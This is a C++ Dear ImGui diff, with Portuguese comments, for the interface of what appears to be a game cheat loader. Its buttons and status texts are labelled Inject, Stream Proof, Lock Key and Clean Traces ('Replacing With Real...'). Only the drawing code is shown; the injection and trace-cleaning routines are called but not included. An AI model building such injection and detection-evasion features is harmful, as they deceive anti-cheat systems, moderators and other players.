+            s_injectPostDone = 0.0f;
+            s_menuOpen = true;
+            s_cleanMenuOpen = false;
+            LaunchInstallerAsync();
         }
     }
 
-    // Hover do BOTÃO INTEIRO: usa a mesma faixa de luz animada dos headers.
-    // A antiga cortina circular foi removida porque escondia o reflexo e dava
-    // a impressão de que somente o label estava sendo animado.
-    const float radius = 0.0f; // conteúdo permanece branco sobre o fundo escuro
+    const float radius = 0.0f;
 
     const float sheenTarget = hovered ? 1.0f : 0.0f;
     const float sheenStep = AnimDeltaTime() * 8.0f;
@@ -831,7 +1168,6 @@ void DrawInjectControl(ImDrawList* draw, const ImVec2& mn, const ImVec2& mx,
     else if (s_injectSheen > sheenTarget)
         s_injectSheen = fmaxf(sheenTarget, s_injectSheen - sheenStep);
 
-    // Halo externo e corpo respondem ao hover em conjunto.
     if (s_injectSheen > 0.001f) {
         for (int i = 3; i >= 1; --i) {
             const float g = (float)i * 1.5f;
@@ -847,8 +1183,6 @@ void DrawInjectControl(ImDrawList* draw, const ImVec2& mn, const ImVec2& mx,
         : (hovered ? IM_COL32(19, 20, 24, 255) : IM_COL32(30, 30, 30, 255));
     draw->AddRectFilled(mn, mx, face, kRound);
 
-    // O reflexo só nasce quando o mouse realmente está sobre o controle e
-    // atravessa toda a superfície, não apenas a área do texto.
     if (s_injectSheen > 0.001f) {
         const float W = mx.x - mn.x;
         const float cycle = W + 150.0f;
@@ -873,11 +1207,8 @@ void DrawInjectControl(ImDrawList* draw, const ImVec2& mn, const ImVec2& mx,
 
     const float H = mx.y - mn.y;
     const ImVec2 tMin(mn.x + 10.0f, mn.y);
-    const ImVec2 tMax(mx.x - kIconZone, mx.y);     // texto não invade o símbolo
+    const ImVec2 tMax(mx.x - kIconZone, mx.y);
 
-    // Rótulo com auto-ajuste: usa kSize, mas encolhe o mínimo necessário para
-    // caber na faixa de texto. Os DOIS rótulos usam o mesmo tamanho, o menor
-    // dos dois, para a troca animada não ficar com fontes diferentes.
     const float availW = tMax.x - tMin.x;
     const float parkedSize = fminf(FitTextSize(font, kInjectLabels[0], kSize, availW),
         FitTextSize(font, kInjectLabels[1], kSize, availW));
@@ -886,9 +1217,6 @@ void DrawInjectControl(ImDrawList* draw, const ImVec2& mn, const ImVec2& mx,
         const ImVec2 ts = font->CalcTextSizeA(size, FLT_MAX, 0.0f, txt);
         const ImVec2 tp(tMin.x, mn.y + (H - ts.y) * 0.5f + dy);
 
-        // Uma única emissão de texto por frame. Evita dezenas de cópias do
-        // mesmo glifo com scissors de 1 px, que causavam corrupção do draw list
-        // em combinações mais antigas de ImGui + DX11.
         const ImVec2 tc(tp.x + ts.x * 0.5f, tp.y + ts.y * 0.5f);
         const float textDist = sqrtf((tc.x - cc.x) * (tc.x - cc.x) +
             (tc.y - cc.y) * (tc.y - cc.y));
@@ -900,15 +1228,11 @@ void DrawInjectControl(ImDrawList* draw, const ImVec2& mn, const ImVec2& mx,
 
     draw->PushClipRect(tMin, tMax, true);
     if (busy) {
-        // Estado "injetando": mostra o modo escolhido pelo tempo da trava
         char buf[64];
         wsprintfA(buf, "%s...", kInjectLabels[s_injectingMode]);
         drawFitted(buf, kSize, 0.0f, 1.0f);
     }
     else if (s_injectAnim < 1.0f) {
-        // Slide vertical no eixo Y: o label anterior sai completamente por
-        // cima e o novo entra completamente por baixo. O clip da faixa de
-        // texto mantém os dois dentro do botão durante a transição.
         drawFitted(kInjectLabels[s_injectPrev], parkedSize, -ap * H, 1.0f);
         drawFitted(kInjectLabels[s_injectMode], parkedSize, (1.0f - ap) * H, 1.0f);
     }
@@ -917,17 +1241,10 @@ void DrawInjectControl(ImDrawList* draw, const ImVec2& mn, const ImVec2& mx,
     }
     draw->PopClipRect();
 
-    // Símbolo de alternar, à direita.
-    //   - na troca: meia volta (cai no mesmo desenho, por causa da simetria 180°)
-    //   - injetando: gira sem parar, dando o feedback de "trabalhando"
     const ImVec2 ic(mx.x - 15.5f, mn.y + H * 0.5f);
     const float rot = busy
-        ? ((kBlockTime - s_injectBusy) / kSpinTime) * 6.2831853f
-        : ap * 3.14159265f; // meia volta suave durante a alternância
-    // Desenha o símbolo UMA única vez. A versão anterior o redesenhava em até
-    // 14 clips horizontais para simular a interseção com o círculo; em alguns
-    // backends/GPUs isso estourava o lote de geometria justamente no primeiro
-    // hover sobre o ícone e corrompia o restante do frame.
+        ? (s_injectElapsed / 1.8f) * 6.2831853f
+        : ap * 3.14159265f;
     const float iconDist = sqrtf((ic.x - cc.x) * (ic.x - cc.x) +
         (ic.y - cc.y) * (ic.y - cc.y));
     const float iconMix = EaseSmooth(Clamp01((radius - iconDist + 4.0f) / 8.0f));
@@ -936,26 +1253,29 @@ void DrawInjectControl(ImDrawList* draw, const ImVec2& mn, const ImVec2& mx,
         IM_COL32(iconShade, iconShade, iconShade, 255), rot);
 }
 
-// ---------------------------------------------------------------------------
-// Botão CLEAN — visual idêntico ao Inject, mas com estado e ID independentes.
-// O ícone alterna entre "Clean Full Traces" e "Clean Traces"; o restante do
-// botão dispara a ação selecionada e mostra um estado curto de processamento.
-// ---------------------------------------------------------------------------
 void DrawCleanControl(ImDrawList* draw, const ImVec2& mn, const ImVec2& mx,
     ImVec2& outMin, ImVec2& outMax) {
     const float kRound = 6.0f;
     const float kSize = 17.0f;
     const float kIconZone = 20.0f;
     const float kSwapTime = 0.26f;
-    const float kWorkTime = 2.5f;
 
     outMin = mn;
     outMax = mx;
     ImFont* font = g_fontText ? g_fontText : ImGui::GetFont();
 
-    if (s_cleanBusy > 0.0f)
-        s_cleanBusy = fmaxf(0.0f, s_cleanBusy - AnimDeltaTime());
-    const bool busy = s_cleanBusy > 0.0f;
+    if (s_cleanActive) {
+        s_cleanElapsed += AnimDeltaTime();
+        const bool done = ::InterlockedCompareExchange(&g_cleanDone, 0, 0) == 1;
+        if (done) {
+            s_cleanPostDone += AnimDeltaTime();
+            if (s_cleanPostDone >= kCleanPostDoneGrace) {
+                s_cleanActive = false;
+                s_cleanMenuOpen = false;
+            }
+        }
+    }
+    const bool busy = s_cleanActive;
 
     ImGui::SetCursorScreenPos(mn);
     ImGui::InvisibleButton("##clean_traces", ImVec2(mx.x - mn.x, mx.y - mn.y));
@@ -963,7 +1283,7 @@ void DrawCleanControl(ImDrawList* draw, const ImVec2& mn, const ImVec2& mx,
     const bool pressed = hovered && !busy && ImGui::IsMouseDown(ImGuiMouseButton_Left);
     const bool overIcon = ImGui::GetIO().MousePos.x >= (mx.x - kIconZone);
 
-    if (ImGui::IsItemClicked() && !busy) {
+    if (ImGui::IsItemClicked() && !busy && !s_injectActive) {
         if (overIcon) {
             s_cleanPrev = s_cleanMode;
             s_cleanMode = 1 - s_cleanMode;
@@ -971,8 +1291,12 @@ void DrawCleanControl(ImDrawList* draw, const ImVec2& mn, const ImVec2& mx,
         }
         else {
             s_cleaningMode = s_cleanMode;
-            s_cleanBusy = kWorkTime;
-            // TODO: execute a limpeza real aqui usando s_cleaningMode.
+            s_cleanActive = true;
+            s_cleanElapsed = 0.0f;
+            s_cleanPostDone = 0.0f;
+            s_cleanMenuOpen = true;
+            s_menuOpen = false;
+            CleanTracesAsync();
         }
     }
 
@@ -1049,15 +1373,11 @@ void DrawCleanControl(ImDrawList* draw, const ImVec2& mn, const ImVec2& mx,
 
     const ImVec2 ic(mx.x - 15.5f, mn.y + H * 0.5f);
     const float rot = busy
-        ? ((kWorkTime - s_cleanBusy) / 1.8f) * 6.2831853f
+        ? (s_cleanElapsed / 1.8f) * 6.2831853f
         : ap * 3.14159265f;
     DrawSwapIcon(draw, ic, 5.0f, IM_COL32(255, 255, 255, 255), rot);
 }
 
-// ---------------------------------------------------------------------------
-// Checkbox vetorial "Stream Proof": paleta do header, reflexo no hover e
-// check desenhado progressivamente. Todo o controle é clicável.
-// ---------------------------------------------------------------------------
 void DrawStreamProofCheckbox(ImDrawList* draw, const ImVec2& mn, const ImVec2& mx,
     ImVec2& outMin, ImVec2& outMax) {
     outMin = mn;
@@ -1070,8 +1390,10 @@ void DrawStreamProofCheckbox(ImDrawList* draw, const ImVec2& mn, const ImVec2& m
     ImGui::InvisibleButton("##stream_proof", ImVec2(mx.x - mn.x, mx.y - mn.y));
     const bool hovered = ImGui::IsItemHovered() && !s_dragging;
     const bool held = hovered && ImGui::IsMouseDown(ImGuiMouseButton_Left);
-    if (ImGui::IsItemClicked())
+    if (ImGui::IsItemClicked()) {
         s_streamProof = !s_streamProof;
+        ApplyStreamProof();
+    }
 
     const float hoverTarget = hovered ? 1.0f : 0.0f;
     const float checkTarget = s_streamProof ? 1.0f : 0.0f;
@@ -1088,113 +1410,161 @@ void DrawStreamProofCheckbox(ImDrawList* draw, const ImVec2& mn, const ImVec2& m
 
     const float ht = EaseSmooth(s_streamProofHover);
     const float ct = EaseSmooth(s_streamProofAnim);
+    const float at = fmaxf(ht, ct);
 
-    // Sem background atrás do label: toda a identidade visual fica contida
-    // exclusivamente na caixa do checkbox.
-    const float boxSize = 18.0f + ct * 1.5f;
-    const ImVec2 bc(mn.x + 15.0f, (mn.y + mx.y) * 0.5f);
+    const float boxSize = 16.0f + ct * 1.5f;
+    const ImVec2 bc(mn.x + 12.0f, (mn.y + mx.y) * 0.5f);
     const ImVec2 b0(bc.x - boxSize * 0.5f, bc.y - boxSize * 0.5f);
     const ImVec2 b1(bc.x + boxSize * 0.5f, bc.y + boxSize * 0.5f);
 
-    // Halo localizado somente ao redor da caixa.
     const float glow = fmaxf(ht * 0.65f, ct);
     if (glow > 0.001f)
         draw->AddRectFilled(ImVec2(b0.x - 3.0f * glow, b0.y - 3.0f * glow),
             ImVec2(b1.x + 3.0f * glow, b1.y + 3.0f * glow),
             IM_COL32(255, 255, 255, (int)(25.0f * glow)), 7.0f);
 
-    // Cor personalizada do header aplicada dentro do checkbox.
     const ImU32 boxBg = held ? IM_COL32(8, 9, 12, 255)
         : IM_COL32(12, 13, 16, 255);
-    draw->AddRectFilled(b0, b1, boxBg, 4.5f);
-    draw->AddRectFilledMultiColor(
-        ImVec2(b0.x + 4.0f, b0.y), ImVec2(b1.x - 4.0f, b1.y),
-        IM_COL32(255, 255, 255, (int)(10.0f + 8.0f * ht)),
-        IM_COL32(255, 255, 255, 2),
-        IM_COL32(255, 255, 255, 0),
-        IM_COL32(255, 255, 255, 6));
-
-    // O reflexo animado também fica limitado ao interior da caixa.
-    if (ht > 0.001f) {
-        const float cycle = boxSize + 28.0f;
-        const float sheenX = b0.x - 14.0f +
-            fmodf((float)ImGui::GetTime() * 48.0f, cycle);
-        AddRoundedSheen(draw, ImVec2(b0.x + 1.0f, b0.y + 1.0f),
-            ImVec2(b1.x - 1.0f, b1.y - 1.0f), 3.5f,
-            sheenX, 8.0f, IM_COL32(255, 255, 255, 0), 0.30f * ht);
-    }
+    draw->AddRectFilled(b0, b1, boxBg, 4.0f);
 
     draw->AddRect(b0, b1,
-        IM_COL32(220, 225, 235,
-            (int)(110.0f + 90.0f * ht + 55.0f * ct)),
-        4.5f, 0, 1.0f);
+        IM_COL32(220, 225, 235, (int)(110.0f + 145.0f * at)),
+        4.0f, 0, 1.0f);
 
-    // Check em dois segmentos, com pontas e junção arredondadas. O traço final
-    // é redesenhado como uma polyline única para o V nunca parecer quebrado.
     if (ct > 0.001f) {
-        const ImVec2 a(bc.x - 6.0f, bc.y - 0.3f);
-        const ImVec2 b(bc.x - 1.5f, bc.y + 4.2f);
-        const ImVec2 c(bc.x + 7.0f, bc.y - 5.2f);
+        const ImVec2 a(bc.x - 5.5f, bc.y - 0.2f);
+        const ImVec2 b(bc.x - 1.3f, bc.y + 4.0f);
+        const ImVec2 c(bc.x + 6.5f, bc.y - 5.0f);
         const ImU32 checkCol = IM_COL32(242, 244, 248, (int)(255.0f * ct));
-        const float thick = 2.35f;
+        const float thick = 2.2f;
         const float capR = thick * 0.5f;
-        const float first = Clamp01(ct / 0.40f);
-        const ImVec2 ab(a.x + (b.x - a.x) * first, a.y + (b.y - a.y) * first);
+        const float kFirst = 0.38f;
 
-        draw->AddLine(a, ab, checkCol, thick);
-        draw->AddCircleFilled(a, capR, checkCol, 12);
-        draw->AddCircleFilled(ab, capR, checkCol, 12);
-
-        if (ct > 0.40f) {
-            const float second = EaseSmooth(Clamp01((ct - 0.40f) / 0.60f));
-            const ImVec2 bc2(b.x + (c.x - b.x) * second, b.y + (c.y - b.y) * second);
-            draw->AddLine(b, bc2, checkCol, thick);
-            draw->AddCircleFilled(b, capR, checkCol, 12);
-            draw->AddCircleFilled(bc2, capR, checkCol, 12);
+        ImVec2 pts[3];
+        int n = 0;
+        pts[n++] = a;
+        if (ct < kFirst) {
+            const float f = EaseSmooth(ct / kFirst);
+            pts[n++] = ImVec2(a.x + (b.x - a.x) * f, a.y + (b.y - a.y) * f);
+        }
+        else {
+            pts[n++] = b;
+            const float f = EaseSmooth((ct - kFirst) / (1.0f - kFirst));
+            pts[n++] = ImVec2(b.x + (c.x - b.x) * f, b.y + (c.y - b.y) * f);
         }
 
-        // Garante uma junção contínua e limpa quando a animação termina.
-        if (ct > 0.985f) {
-            const ImVec2 pts[3] = { a, b, c };
-            draw->AddPolyline(pts, 3, checkCol, 0, thick);
-            draw->AddCircleFilled(a, capR, checkCol, 12);
-            draw->AddCircleFilled(b, capR, checkCol, 12);
-            draw->AddCircleFilled(c, capR, checkCol, 12);
-        }
+        draw->AddPolyline(pts, n, checkCol, 0, thick);
+        draw->AddCircleFilled(a, capR, checkCol);
+        draw->AddCircleFilled(pts[n - 1], capR, checkCol);
     }
 
     const char* label = "Stream Proof";
-    const float textSize = 14.0f;
+    const float textSize = 13.0f;
     const ImVec2 ts = font->CalcTextSizeA(textSize, FLT_MAX, 0.0f, label);
-    const ImVec2 tp(mn.x + 31.0f + ht, mn.y + ((mx.y - mn.y) - ts.y) * 0.5f);
-    draw->AddText(font, textSize, ImVec2(tp.x, tp.y + 1.0f),
-        IM_COL32(0, 0, 0, 160), label);
+    const ImVec2 tp(mn.x + 26.0f, mn.y + ((mx.y - mn.y) - ts.y) * 0.5f);
     draw->AddText(font, textSize, tp,
-        IM_COL32(242, 244, 248, (int)(220.0f + 35.0f * ht)), label);
+        IM_COL32(242, 244, 248, (int)(220.0f + 35.0f * at)), label);
 }
 
-// ---------------------------------------------------------------------------
-// MENU de progresso do inject (abre no clique de disparo). Mostra um spinner
-// girando e, embaixo, a etapa atual:
-//   0..2s  -> "Downloading Modules..."
-//   2..4s  -> "Injecting..."
-// A duração é a MESMA da trava do botão (kInjectWorkTime = 4s).
-// ---------------------------------------------------------------------------
+void DrawLockKeyCheckbox(ImDrawList* draw, const ImVec2& mn, const ImVec2& mx,
+    ImVec2& outMin, ImVec2& outMax) {
+    outMin = mn;
+    outMax = mx;
+
+    const float dt = AnimDeltaTime();
+    ImFont* font = g_fontText ? g_fontText : ImGui::GetFont();
+
+    ImGui::SetCursorScreenPos(mn);
+    ImGui::InvisibleButton("##lock_key", ImVec2(mx.x - mn.x, mx.y - mn.y));
+    const bool hovered = ImGui::IsItemHovered() && !s_dragging;
+    const bool held = hovered && ImGui::IsMouseDown(ImGuiMouseButton_Left);
+    if (ImGui::IsItemClicked())
+        s_lockKey = !s_lockKey;
+
+    const float hoverTarget = hovered ? 1.0f : 0.0f;
+    const float checkTarget = s_lockKey ? 1.0f : 0.0f;
+    const float hoverStep = dt * 8.0f;
+    const float checkStep = dt * 6.5f;
+    if (s_lockKeyHover < hoverTarget)
+        s_lockKeyHover = fminf(hoverTarget, s_lockKeyHover + hoverStep);
+    else
+        s_lockKeyHover = fmaxf(hoverTarget, s_lockKeyHover - hoverStep);
+    if (s_lockKeyAnim < checkTarget)
+        s_lockKeyAnim = fminf(checkTarget, s_lockKeyAnim + checkStep);
+    else
+        s_lockKeyAnim = fmaxf(checkTarget, s_lockKeyAnim - checkStep);
+
+    const float ht = EaseSmooth(s_lockKeyHover);
+    const float ct = EaseSmooth(s_lockKeyAnim);
+    const float at = fmaxf(ht, ct);
+
+    const float boxSize = 16.0f + ct * 1.5f;
+    const ImVec2 bc(mn.x + 12.0f, (mn.y + mx.y) * 0.5f);
+    const ImVec2 b0(bc.x - boxSize * 0.5f, bc.y - boxSize * 0.5f);
+    const ImVec2 b1(bc.x + boxSize * 0.5f, bc.y + boxSize * 0.5f);
+
+    const float glow = fmaxf(ht * 0.65f, ct);
+    if (glow > 0.001f)
+        draw->AddRectFilled(ImVec2(b0.x - 3.0f * glow, b0.y - 3.0f * glow),
+            ImVec2(b1.x + 3.0f * glow, b1.y + 3.0f * glow),
+            IM_COL32(255, 255, 255, (int)(25.0f * glow)), 7.0f);
+
+    const ImU32 boxBg = held ? IM_COL32(8, 9, 12, 255)
+        : IM_COL32(12, 13, 16, 255);
+    draw->AddRectFilled(b0, b1, boxBg, 4.0f);
+
+    draw->AddRect(b0, b1,
+        IM_COL32(220, 225, 235, (int)(110.0f + 145.0f * at)),
+        4.0f, 0, 1.0f);
+
+    if (ct > 0.001f) {
+        const ImVec2 a(bc.x - 5.5f, bc.y - 0.2f);
+        const ImVec2 b(bc.x - 1.3f, bc.y + 4.0f);
+        const ImVec2 c(bc.x + 6.5f, bc.y - 5.0f);
+        const ImU32 checkCol = IM_COL32(242, 244, 248, (int)(255.0f * ct));
+        const float thick = 2.2f;
+        const float capR = thick * 0.5f;
+        const float kFirst = 0.38f;
+
+        ImVec2 pts[3];
+        int n = 0;
+        pts[n++] = a;
+        if (ct < kFirst) {
+            const float f = EaseSmooth(ct / kFirst);
+            pts[n++] = ImVec2(a.x + (b.x - a.x) * f, a.y + (b.y - a.y) * f);
+        }
+        else {
+            pts[n++] = b;
+            const float f = EaseSmooth((ct - kFirst) / (1.0f - kFirst));
+            pts[n++] = ImVec2(b.x + (c.x - b.x) * f, b.y + (c.y - b.y) * f);
+        }
+
+        draw->AddPolyline(pts, n, checkCol, 0, thick);
+        draw->AddCircleFilled(a, capR, checkCol);
+        draw->AddCircleFilled(pts[n - 1], capR, checkCol);
+    }
+
+    const char* label = "Lock Key (Del)";
+    const float textSize = 13.0f;
+    const ImVec2 ts = font->CalcTextSizeA(textSize, FLT_MAX, 0.0f, label);
+    const ImVec2 tp(mn.x + 26.0f, mn.y + ((mx.y - mn.y) - ts.y) * 0.5f);
+    draw->AddText(font, textSize, tp,
+        IM_COL32(242, 244, 248, (int)(220.0f + 35.0f * at)), label);
+}
+
 void DrawInjectMenu(ImDrawList* draw, const ImVec2& p, const ImVec2& q) {
     if (!s_menuOpen) return;
 
-    s_menuT += AnimDeltaTime();
-    if (s_menuT >= kInjectWorkTime) {          // terminou: fecha o menu
-        s_menuOpen = false;
-        return;
-    }
-    const float t = s_menuT;
-    const float fade = fminf(1.0f, fminf(t * 8.0f, (kInjectWorkTime - t) * 8.0f));
+    const bool wasCached = ::InterlockedCompareExchange(&g_installerWasCached, 0, 0) == 1;
+    const bool hadRunning = ::InterlockedCompareExchange(&g_installerHadRunning, 0, 0) == 1;
+    const bool slept = ::InterlockedCompareExchange(&g_installerSlept, 0, 0) == 1;
+    const bool done = ::InterlockedCompareExchange(&g_installerDone, 0, 0) == 1;
+    const bool failed = ::InterlockedCompareExchange(&g_installerFailed, 0, 0) == 1;
 
-    // Escurece o painel inteiro para dar foco ao menu
+    const float fade = fminf(1.0f, s_injectElapsed * 8.0f);
+
     draw->AddRectFilled(p, q, IM_COL32(0, 0, 0, (int)(120.0f * fade)), kRounding);
 
-    // Card centralizado
     const float w = 236.0f, h = 96.0f;
     const ImVec2 c((p.x + q.x) * 0.5f, (p.y + q.y) * 0.5f);
     const ImVec2 mn(c.x - w * 0.5f, c.y - h * 0.5f);
@@ -1203,26 +1573,75 @@ void DrawInjectMenu(ImDrawList* draw, const ImVec2& p, const ImVec2& q) {
     draw->AddRectFilled(mn, mx, IM_COL32(30, 30, 30, (int)(255.0f * fade)), round);
     draw->AddRect(mn, mx, IM_COL32(120, 120, 120, (int)(140.0f * fade)), round, 0, 1.0f);
 
-    // Spinner girando
-    DrawSpinner(draw, ImVec2(c.x, mn.y + 34.0f), 13.0f, t * 5.2f,
+    DrawSpinner(draw, ImVec2(c.x, mn.y + 34.0f), 13.0f, (float)ImGui::GetTime() * 5.2f,
         IM_COL32(255, 255, 255, (int)(240.0f * fade)));
 
-    // Etapa embaixo
     ImFont* font = g_fontText ? g_fontText : ImGui::GetFont();
-    const char* txt = (t < kInjectWorkTime * 0.5f) ? "Downloading Modules..." : "Injecting...";
+
+    const char* txt = nullptr;
+    if (failed)
+        txt = "Inject Failed.";
+    else if (slept)
+        txt = "Entre No Jogo e Farme Aura!";
+    else if (hadRunning)
+        txt = "Attaching to Background App...";
+    else if (!wasCached && !done)
+        txt = "Downloading Modules...";
+    else
+        txt = "Injecting...";
+
     const float size = 14.0f;
     const ImVec2 ts = font->CalcTextSizeA(size, FLT_MAX, 0.0f, txt);
     draw->AddText(font, size, ImVec2(c.x - ts.x * 0.5f, mn.y + 60.0f),
         IM_COL32(255, 255, 255, (int)(245.0f * fade)), txt);
 }
 
-// ---------------------------------------------------------------------------
-// Cards: fundo na MESMA cor do botão Unload.
-// ---------------------------------------------------------------------------
+void DrawCleanMenu(ImDrawList* draw, const ImVec2& p, const ImVec2& q) {
+    if (!s_cleanMenuOpen) return;
+
+    const LONG stage = ::InterlockedCompareExchange(&g_cleanStage, 0, 0);
+    const bool found = ::InterlockedCompareExchange(&g_cleanFound, 0, 0) == 1;
+    const bool done = ::InterlockedCompareExchange(&g_cleanDone, 0, 0) == 1;
+    const bool failed = ::InterlockedCompareExchange(&g_cleanFailed, 0, 0) == 1;
+
+    const float fade = fminf(1.0f, s_cleanElapsed * 8.0f);
+
+    draw->AddRectFilled(p, q, IM_COL32(0, 0, 0, (int)(120.0f * fade)), kRounding);
+
+    const float w = 236.0f, h = 96.0f;
+    const ImVec2 c((p.x + q.x) * 0.5f, (p.y + q.y) * 0.5f);
+    const ImVec2 mn(c.x - w * 0.5f, c.y - h * 0.5f);
+    const ImVec2 mx(c.x + w * 0.5f, c.y + h * 0.5f);
+    const float round = 12.0f;
+    draw->AddRectFilled(mn, mx, IM_COL32(30, 30, 30, (int)(255.0f * fade)), round);
+    draw->AddRect(mn, mx, IM_COL32(120, 120, 120, (int)(140.0f * fade)), round, 0, 1.0f);
+
+    DrawSpinner(draw, ImVec2(c.x, mn.y + 34.0f), 13.0f, (float)ImGui::GetTime() * 5.2f,
+        IM_COL32(255, 255, 255, (int)(240.0f * fade)));
+
+    ImFont* font = g_fontText ? g_fontText : ImGui::GetFont();
+
+    const char* txt = nullptr;
+    if (failed)
+        txt = "Clean Failed.";
+    else if (done && found)
+        txt = "Real Installed.";
+    else if (done && !found)
+        txt = "No Traces Found.";
+    else if (stage >= 1)
+        txt = "Replacing With Real...";
+    else
+        txt = "Scanning Traces...";
+
+    const float size = 14.0f;
+    const ImVec2 ts = font->CalcTextSizeA(size, FLT_MAX, 0.0f, txt);
+    draw->AddText(font, size, ImVec2(c.x - ts.x * 0.5f, mn.y + 60.0f),
+        IM_COL32(255, 255, 255, (int)(245.0f * fade)), txt);
+}
+
 static char s_userName[256] = { 0 };
 static char s_pcName[256] = { 0 };
 
-// Pega o usuário do Windows e o nome do PC (chamar uma vez, antes do loop).
 void FetchSystemInfo() {
     DWORD n = sizeof(s_userName);
     if (!::GetUserNameA(s_userName, &n))
@@ -1232,14 +1651,12 @@ void FetchSystemInfo() {
         wsprintfA(s_pcName, "-");
 }
 
-// Fundo + borda de card (mesma cor do corpo do botão Unload).
 void DrawCardBase(ImDrawList* draw, const ImVec2& mn, const ImVec2& mx) {
     const float rounding = 14.0f;
     draw->AddRectFilled(mn, mx, IM_COL32(30, 30, 30, 255), rounding);
     draw->AddRect(mn, mx, IM_COL32(85, 85, 85, 80), rounding, 0, 1.0f);
 }
 
-// Linha de info: ícone à esquerda, rótulo apagado em cima, valor branco embaixo.
 void DrawInfoRow(ImDrawList* draw, ImFont* font, float x, float& y,
     const char* icon, const char* label, const char* value) {
     ImFont* iconFont = g_fontIcons ? g_fontIcons : ImGui::GetFont();
@@ -1250,13 +1667,11 @@ void DrawInfoRow(ImDrawList* draw, ImFont* font, float x, float& y,
     const float valueH = font->CalcTextSizeA(kLabelSize, FLT_MAX, 0.0f, value).y;
     const float rowH = labelH + 2.0f + valueH;
 
-    // Ícone centralizado na altura da linha
     const ImVec2 its = iconFont->CalcTextSizeA(iconSize, FLT_MAX, 0.0f, icon);
     draw->AddText(iconFont, iconSize,
         ImVec2(x, y + (rowH - its.y) * 0.5f),
         IM_COL32(255, 255, 255, 200), icon);
 
-    // Rótulo (apagado) e valor (branco)
     draw->AddText(font, kLabelSize, ImVec2(textX, y), IM_COL32(255, 255, 255, 110), label);
     draw->AddText(font, kLabelSize, ImVec2(textX, y + labelH + 2.0f),
         IM_COL32(255, 255, 255, 240), value);
@@ -1264,79 +1679,13 @@ void DrawInfoRow(ImDrawList* draw, ImFont* font, float x, float& y,
     y += rowH + 12.0f;
 }
 
-// ---------------------------------------------------------------------------
-// HEADER COM FUMAÇA — o fundo do header é PRETO e a FUMAÇA BRANCA passeia por
-// cima, envolvendo-o: névoa larga (volume) + fita ondulada (corpo) + volutas
-// cruzando no sentido oposto (turbulência) + bolhas que sobem + fumaça
-// lambendo as bordas + faíscas à deriva.
-//
-// O ImGui não tem gradiente radial, então cada "baforada" é um retângulo com
-// 4 rampas de alfa nas bordas e o miolo recuado — NUNCA um quadrado opaco.
-//
-// >>> ATENÇÃO (era o bug do "card piscando"): a cor passada para
-//     AddSmokeBlob tem que ter ALFA = 0 (ex.: IM_COL32(234,239,245,0)).
-//     A função descarta o alfa recebido e monta o alfa POR BLOB
-//     (rgb | alfa<<24). Se o RGB chegar com alfa 255, o OR mantém 255 e
-//     cada blob vira um retângulo 100% OPACO — foi isso que deixou os cards
-//     "piscando" cheios de quadrados brancos e criou um "fundo" atrás de
-//     INFOS/FEATURES.
-// ---------------------------------------------------------------------------
-static inline float Hash01(int i) {
-    const float s = sinf((float)i * 12.9898f) * 43758.5453f;
-    return s - floorf(s);                       // 0..1 determinístico
-}
-
-static inline float WrapRange(float x, float lo, float hi) {
-    const float span = hi - lo;
-    float m = fmodf(x - lo, span);
-    if (m < 0.0f) m += span;
-    return lo + m;
-}
-
-// Baforada: miolo (alfa cheio) + 4 rampas (alfa 0 -> cheio).
-// A rampa é proporcional ao raio: blob grande = borda bem macia; blob pequeno
-// = as rampas se encontram no centro (perfil de "tenda", sem miolo duro).
-static void AddSmokeBlob(ImDrawList* draw, ImVec2 c, float r, ImU32 rgb,
-    float alpha) {
-    if (alpha <= 0.004f || r <= 0.5f) return;
-
-    rgb &= 0x00FFFFFFu;                       // RGB puro (ver aviso no topo)
-    const ImU32 aFull = rgb | (((ImU32)(255.0f * alpha)) << 24);
-
-    float fade = fmaxf(1.5f, r * 0.42f);
-    float core = r - fade;
-    if (core < 0.5f) core = 0.5f;   // garante miolo: sem buraco e sem virar "cruz"
-    fade = r - core;                // a rampa se ajusta ao miolo garantido
-
-    if (core > 0.0f)                          // miolo sólido (recuado)
-        draw->AddRectFilled(ImVec2(c.x - core, c.y - core),
-            ImVec2(c.x + core, c.y + core), aFull);
-
-    const float x0 = c.x - r, x1 = c.x + r, y0 = c.y - r, y1 = c.y + r;
-    const float fx0 = x0 + fade, fy0 = y0 + fade;
-    const float fx1 = x1 - fade, fy1 = y1 - fade;
-    draw->AddRectFilledMultiColor(ImVec2(x0, y0), ImVec2(fx0, y1),
-        rgb, aFull, aFull, rgb);              // rampa ESQUERDA
-    draw->AddRectFilledMultiColor(ImVec2(fx1, y0), ImVec2(x1, y1),
-        aFull, rgb, rgb, aFull);              // rampa DIREITA
-    draw->AddRectFilledMultiColor(ImVec2(x0, y0), ImVec2(x1, fy0),
-        rgb, rgb, aFull, aFull);              // rampa de CIMA
-    draw->AddRectFilledMultiColor(ImVec2(x0, fy1), ImVec2(x1, y1),
-        aFull, aFull, rgb, rgb);              // rampa de BAIXO
-}
-
-// O ImGui só tem clip RETANGULAR, então a fumaça (que é reta) passaria por
-// cima das curvas de cima do header e deixaria as pontas "quadradas/pontudas".
-// Aqui a gente devolve a curva: cobre o bico (quadrado menos arco) com a cor
-// do fundo do painel, faixa por faixa. Como o próprio header é quase preto,
-// a cobertura pode sobrar 1px pra dentro sem nenhum efeito visual.
 static void MaskTopCorners(ImDrawList* draw, const ImVec2& mn, const ImVec2& mx,
     float rounding, ImU32 bg) {
-    const float R = rounding + 1.0f;                 // 1px de folga: nada escapa
+    const float R = rounding + 1.0f;
     for (int i = 0; i <= (int)rounding; ++i) {
         const float dy = R - ((float)i + 0.5f);
         const float dx = sqrtf(fmaxf(0.0f, R * R - dy * dy));
-        const float w = R - dx;                      // largura a cobrir nesta linha
+        const float w = R - dx;
         if (w <= 0.05f) continue;
         const float y0 = mn.y + (float)i;
         draw->AddRectFilled(ImVec2(mn.x, y0), ImVec2(mn.x + w, y0 + 1.0f), bg);
@@ -1344,40 +1693,6 @@ static void MaskTopCorners(ImDrawList* draw, const ImVec2& mn, const ImVec2& mx,
     }
 }
 
-// Parâmetros da fumaça (mexa aqui para calibrar; nada de número solto no meio)
-struct SmokeCfg {
-    float kOmega = 2.4f;      // velocidade da ondulação
-    float kTide = 7.0f;       // segundos entre uma inversão e outra
-
-    int   nebN = 4;           // névoa de fundo
-    float nebR0 = 17.0f, nebR1 = 38.0f, nebA0 = 0.020f, nebA1 = 0.038f;
-
-    // Passos maiores mantêm o visual, mas reduzem bastante os vértices. O lote
-    // anterior chegava perto do limite de índices de backends ImGui/DX11 mais
-    // antigos; ao clicar e adicionar a animação, as cores podiam corromper.
-    float ropeStep = 4.0f;    // corpo (fita ondulada)
-    float ropeLam = 82.0f;    // comprimento de onda (px)
